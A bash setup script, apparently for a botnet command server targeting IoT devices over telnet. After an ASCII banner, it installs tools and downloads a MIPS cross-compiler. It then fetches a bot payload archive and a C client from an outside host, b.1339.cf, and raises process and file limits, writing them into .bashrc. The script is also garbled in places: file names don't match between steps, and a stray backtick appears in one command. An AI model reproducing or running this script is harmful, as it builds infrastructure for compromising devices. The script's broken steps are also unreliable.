#!/bin/bash

echo "###############################################################################"
echo "# ___     __________  ____ _______      _____ _______________.___.  ___       #"
echo "# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\  #"
echo "# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/  #"
echo "#           |    |   \ |   /    |    \/    |    \    |   \\____   |           #"
echo "#           |______  / |___\____|__  /\____|__  /____|_  // ______|           #"
echo "#                  \/              \/         \/       \/ \/                  #"
echo "###############################################################################"

JAVANET='http://b.1339.cf/qbrdwgg.zip'
CLIENT='http://b.1339.cf/sygnxbv.c'

#########################################
#############DEPENDENCIES################
#########################################

echo "Setting Up Dependencies For JS P2P Telnet"
yum install curl; yum install screen -y; yum install httpd -y; yum install telnet -y; yum install gcc -y; yum install nano -y; yum install unzip -y; yum install wget; yum install glibc.i686 -y
curl --silent --location https://rpm.nodesource.com/setup | bash -; yum install nodejs -y;

#########################################
###############WGETTING##################
#########################################

echo"Getting Your Files"
mkdir compile;
mkdir telnet;
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 && tar -vxjf cross-compiler-mips.tar.bz2;
wget --quiet $JAVANET -O JAVANET.zip; unzip JAVANET.zip
wget --quiet $CLIENT -O hope.c; mv hope.c /root/cross-compiler-mips/bin

#########################################
###############ORGANIZING################
#########################################

cd /root/; mv cross-compiler-mips compile;
cd /root/; mv sygnxbv.c compile;
cd /root/telnet/; mv sygnxbv.c cross-compiler-mips;
cd /root/telnet/cross-compiler-mips; mv sygnxbv.c bin
cd /root/; mv qbrdwgg.zip telnet;
cd /root/telnet/; unzip *zip;
cd /root/telnet/; rm -rf qbraq`dwgg.zip;
cd /root/; rm -rf cross-compiler-mips.tar.bz2;

#########################################
################ULIMIT###################
#########################################

echo "Changing The Ulimit"
ulimit -u 999999;ulimit -n 999999
echo "#.bashrc">> .bashrc
echo "#ulimit set">> .bashrc
echo "ulimit -u 999999">> .bashrc
echo "ulimit -n 999999">> .bashrc
sysctl -w fs.file-max=100000
echo "Done, Your On Your Own Now"